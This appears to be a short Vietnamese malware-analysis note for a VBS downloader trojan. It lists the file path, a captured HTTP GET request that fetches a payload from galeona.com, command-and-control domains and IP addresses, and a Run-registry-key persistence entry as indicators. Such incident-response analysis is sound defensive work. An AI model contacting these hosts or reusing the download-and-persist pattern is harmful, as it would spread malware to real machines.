@@ -1,0 +1,20 @@
+﻿File độc hại:
+c:\users\asus\appdata\roaming\microsoft\i_865556~1.vbs	8/31/2017 1:45 AM
+
+Phân tích: i_865556~1.vbs
+
+- Phân loại:  Trojan.VBS.Downloader
+- Luồng hoạt động chính:
+	send requests GET đến máy chủ - Download file
+	GET /GHFbfsalku65? HTTP/1.1Accept: */*Accept-Language: en-usUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0Accept-Encoding: gzip, deflateHost: galeona.comConnection: Keep-Alive	
+	
+- Máy chủ điều khiển:
+	87hfdredwertyfdvvlkgdrsadm.net
+	galeona.com				212.89.16.142:80
+	gbstamps4u.com				185.119.173.239:80
+- Giao thức điều khiển: HTTP/ TCp không mã hóa
+- Dấu hiệu nhận biết:
+	script vbs được auto run. tên script đáng nghi
+	HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run		10/17/2017 3:43 PM	
+	backup	c:\users\asus\appdata\roaming\microsoft\i_865556~1.vbs	8/31/2017 1:45 AM
+	
